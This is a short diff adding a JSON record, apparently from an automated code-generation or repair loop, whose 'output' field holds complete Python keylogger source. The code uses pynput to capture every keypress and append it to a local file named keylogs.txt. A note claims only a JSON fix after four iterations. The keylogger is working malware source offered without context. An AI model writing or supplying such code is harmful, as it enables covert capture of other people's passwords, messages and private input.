@@ -1,0 +1,8 @@
+{
+  "output": "import os\nimport sys\nimport pyautogui\nfrom pynput import keyboard\n\nlog_file = 'keylogs.txt'\n\ndef on_press(key):\n    try:\n        with open(log_file, 'a') as f:\n            f.write(str(key))\n        print('Key {0} pressed'.format(key))\n    except Exception as e:\n        print('Error: could not write to log file', e)\n\ndef on_release(key):\n    if key == keyboard.Key.esc:\n        return False\n\nif __name__ == '__main__':\n    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n        listener.join()",
+  "notes": "Fixed JSON error in code.",
+  "applied_fixes": [
+    "major_issue1"
+  ],
+  "iterations": 4
+}
